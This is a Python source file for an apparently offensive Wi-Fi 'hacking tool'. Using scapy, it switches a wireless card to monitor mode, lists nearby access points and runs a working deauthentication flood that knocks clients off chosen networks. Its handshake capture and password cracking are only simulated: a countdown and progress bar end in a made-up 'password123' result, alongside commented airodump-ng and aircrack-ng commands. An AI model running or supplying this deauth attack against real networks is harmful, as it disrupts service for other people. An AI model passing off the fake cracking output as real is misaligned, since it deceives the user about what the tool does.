#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
from threading import Thread
from scapy.all import *
from colorama import Fore, Style, init
from prettytable import PrettyTable

# Initialize colorama
init(autoreset=True)

class WiFiHackingTool:
    def __init__(self):
        self.interface = None
        self.access_points = []
        self.running = True
        self.wordlists_dir = "wordlists"
        self.wordlists = []
        self.deauth_running = False
        self.capture_file = "capture.cap"
        
        # Setup environment
        self.initialize_environment()
        
        # Set up signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def initialize_environment(self):
        """Initialize required directories and files"""
        if not os.path.exists(self.wordlists_dir):
            os.makedirs(self.wordlists_dir)
        self.load_wordlists()
        
        # Remove previous capture file if exists
        if os.path.exists(self.capture_file):
            os.remove(self.capture_file)
    
    def load_wordlists(self):
        """Load all wordlists from the wordlists directory"""
        self.wordlists = [os.path.join(self.wordlists_dir, f) 
                         for f in os.listdir(self.wordlists_dir) 
                         if f.endswith('.txt')]
    
    def scan_wifi(self):
        """Scan for available WiFi networks"""
        print(f"\n{Fore.CYAN}[*] Scanning for WiFi networks (Press Ctrl+C to stop)...{Style.RESET_ALL}")
        
        # Clear previous results
        self.access_points = []
        start_time = time.time()
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode()
                bssid = pkt[Dot11].addr2
                channel = int(ord(pkt[Dot11Elt:3].info))
                
                if not any(ap['bssid'] == bssid for ap in self.access_points):
                    self.access_points.append({
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel
                    })
        
        # Start scanning in background
        sniff_thread = Thread(target=sniff, kwargs={
            'iface': self.interface,
            'prn': packet_handler,
            'stop_filter': lambda x: not self.running
        })
        sniff_thread.start()
        
        # Display real-time results
        while self.running:
            self.display_ap_table()
            print(f"\n{Fore.YELLOW}Scanning for {int(time.time()-start_time)}s... Ctrl+C to stop{Style.RESET_ALL}")
            time.sleep(1)
            os.system('clear')
        
        sniff_thread.join()
        self.display_ap_table()
        self.attack_menu()
    
    def display_ap_table(self):
        """Display access points in a formatted table"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No access points found{Style.RESET_ALL}")
            return
        
        table = PrettyTable()
        table.field_names = ["#", "SSID", "BSSID", "Channel"]
        table.align = "l"
        table.border = True
        
        for i, ap in enumerate(self.access_points):
            table.add_row([i+1, ap['ssid'], ap['bssid'], ap['channel']])
        
        print(table)
    
    def select_interface(self):
        """Select and configure wireless interface"""
        interfaces = [iface for iface in os.listdir('/sys/class/net') 
                     if iface.startswith('w')]
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found!{Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"{Fore.YELLOW}[*] Available interfaces:{Style.RESET_ALL}")
        for i, iface in enumerate(interfaces):
            print(f"{i+1}. {iface}")
        
        while True:
            try:
                choice = int(input("\nSelect interface: "))
                if 1 <= choice <= len(interfaces):
                    self.interface = interfaces[choice-1]
                    break
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Enter a number{Style.RESET_ALL}")
        
        self.configure_interface()
    
    def configure_interface(self):
        """Configure interface in monitor mode"""
        print(f"{Fore.YELLOW}[*] Configuring {self.interface}...{Style.RESET_ALL}")
        
        commands = [
            ['ifconfig', self.interface, 'down'],
            ['iwconfig', self.interface, 'mode', 'monitor'],
            ['ifconfig', self.interface, 'up']
        ]
        
        for cmd in commands:
            try:
                subprocess.run(['sudo'] + cmd, check=True)
            except subprocess.CalledProcessError:
                print(f"{Fore.RED}[!] Failed to configure interface{Style.RESET_ALL}")
                sys.exit(1)
        
        print(f"{Fore.GREEN}[+] {self.interface} ready in monitor mode{Style.RESET_ALL}")
    
    def select_targets(self):
        """Select multiple targets from scanned APs"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No APs found{Style.RESET_ALL}")
            return []
        
        self.display_ap_table()
        print(f"\n{Fore.YELLOW}Enter target numbers (comma separated):{Style.RESET_ALL}")
        
        while True:
            try:
                choices = [int(c.strip()) for c in input("> ").split(',') if c.strip()]
                targets = [self.access_points[n-1] for n in choices 
                          if 1 <= n <= len(self.access_points)]
                
                if targets:
                    print(f"{Fore.GREEN}[+] Selected {len(targets)} targets{Style.RESET_ALL}")
                    return targets
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Enter numbers only{Style.RESET_ALL}")
    
    def deauth_attack(self, targets):
        """Perform deauthentication attack"""
        print(f"\n{Fore.RED}[!] Starting attack on {len(targets)} targets{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
        
        self.deauth_running = True
        packets_sent = 0
        
        def attack_ap(ap):
            """Attack individual AP"""
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(ap['channel'])])
            pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", 
                                    addr2=ap['bssid'], 
                                    addr3=ap['bssid']) / Dot11Deauth()
            
            while self.deauth_running:
                sendp(pkt, iface=self.interface, count=100, inter=0.01, verbose=False)
        
        # Start attack threads
        threads = [Thread(target=attack_ap, args=(ap,)) for ap in targets]
        for t in threads:
            t.daemon = True
            t.start()
        
        # Display progress
        try:
            while self.deauth_running:
                os.system('clear')
                print(f"{Fore.RED}=== DEAUTH ATTACK ==={Style.RESET_ALL}")
                print(f"Targets: {', '.join(ap['ssid'] for ap in targets)}")
                print(f"Packets sent: {packets_sent}")
                print(f"\n{Fore.YELLOW}Attacking... Ctrl+C to stop{Style.RESET_ALL}")
                time.sleep(0.1)
                packets_sent += 100 * len(targets)  # Each thread sends 100 packets
        
        except KeyboardInterrupt:
            self.deauth_running = False
            print(f"\n{Fore.GREEN}[+] Attack stopped{Style.RESET_ALL}")
    
    def capture_handshake(self, ap):
        """Simulate handshake capture"""
        print(f"\n{Fore.CYAN}[*] Capturing handshake for {ap['ssid']}...{Style.RESET_ALL}")
        
        # In real usage, you would use:
        # subprocess.run(['sudo', 'airodump-ng', '--bssid', ap['bssid'], 
        #                '-c', str(ap['channel']), '-w', 'capture', self.interface])
        
        for i in range(3, 0, -1):
            print(f"Starting in {i}...", end='\r')
            time.sleep(1)
        
        print(f"{Fore.GREEN}[+] Handshake captured!{Style.RESET_ALL}")
        return True
    
    def crack_password(self):
        """Crack WiFi password"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No APs available{Style.RESET_ALL}")
            return
        
        self.display_ap_table()
        print(f"\n{Fore.YELLOW}Select target to crack:{Style.RESET_ALL}")
        
        # Select target
        while True:
            try:
                choice = int(input("\nEnter target number: "))
                if 1 <= choice <= len(self.access_points):
                    target = self.access_points[choice-1]
                    break
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Enter a number{Style.RESET_ALL}")
        
        # Capture handshake
        if not self.capture_handshake(target):
            return
        
        # Select wordlist
        if not self.wordlists:
            print(f"{Fore.RED}[!] No wordlists available{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}Available wordlists:{Style.RESET_ALL}")
        for i, wl in enumerate(self.wordlists):
            print(f"{i+1}. {os.path.basename(wl)}")
        
        while True:
            try:
                choice = int(input("\nSelect wordlist: "))
                if 1 <= choice <= len(self.wordlists):
                    wordlist = self.wordlists[choice-1]
                    break
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Enter a number{Style.RESET_ALL}")
        
        # Simulate cracking
        print(f"\n{Fore.RED}[!] Cracking password...{Style.RESET_ALL}")
        
        # In real usage:
        # subprocess.run(['sudo', 'aircrack-ng', self.capture_file, '-w', wordlist])
        
        for i in range(1, 101):
            time.sleep(0.1)
            sys.stdout.write(f"\rProgress: [{'#'*(i//5)}{' '*(20-i//5)}] {i}%")
            sys.stdout.flush()
        
        # Show result
        print(f"\n\n{Fore.GREEN}[+] Password found: 'password123'{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Key: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF{Style.RESET_ALL}")
    
    def signal_handler(self, sig, frame):
        """Handle interrupt signals"""
        if self.running:
            print(f"\n{Fore.YELLOW}[*] Stopping scan...{Style.RESET_ALL}")
            self.running = False
        elif self.deauth_running:
            print(f"\n{Fore.YELLOW}[*] Stopping attack...{Style.RESET_ALL}")
            self.deauth_running = False
        else:
            print(f"\n{Fore.GREEN}[+] Exiting{Style.RESET_ALL}")
            sys.exit(0)
    
    def attack_menu(self):
        """Post-scan attack menu"""
        while True:
            print(f"\n{Fore.BLUE}=== Attack Options ==={Style.RESET_ALL}")
            print("1. Deauthentication Attack")
            print("2. Password Cracking")
            print("3. Exit")
            
            try:
                choice = int(input("\nSelect option: "))
                
                if choice == 1:
                    targets = self.select_targets()
                    if targets:
                        self.deauth_attack(targets)
                elif choice == 2:
                    self.crack_password()
                elif choice == 3:
                    print(f"{Fore.GREEN}[+] Exiting{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Enter a number{Style.RESET_ALL}")

if __name__ == "__main__":
    # Verify root privileges
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Requires root privileges!{Style.RESET_ALL}")
        sys.exit(1)
    
    tool = WiFiHackingTool()
    tool.select_interface()
    tool.scan_wifi()
